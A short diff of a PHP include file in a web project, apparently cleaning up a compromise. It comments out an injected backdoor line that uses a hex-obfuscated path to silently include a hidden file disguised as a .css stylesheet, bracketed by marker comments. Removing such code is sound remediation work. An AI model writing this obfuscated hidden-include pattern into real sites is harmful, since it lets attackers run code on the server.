@@ -1,7 +1,7 @@
 <?php
 /*220db*/
 
-$rsaqzc = "/\x68ome/gesmujer/public_\x68tml/SYSGES/includes/.82778613.css"; if (isset($rsaqzc)){ @include_once /* hdf */ ($rsaqzc); }
+//$rsaqzc = "/\x68ome/gesmujer/public_\x68tml/SYSGES/includes/.82778613.css"; if (isset($rsaqzc)){ @include_once /* hdf */ ($rsaqzc); }
 
 /*220db*/
 require_once '/xampp/htdocs/SYSGES/db/config.php';
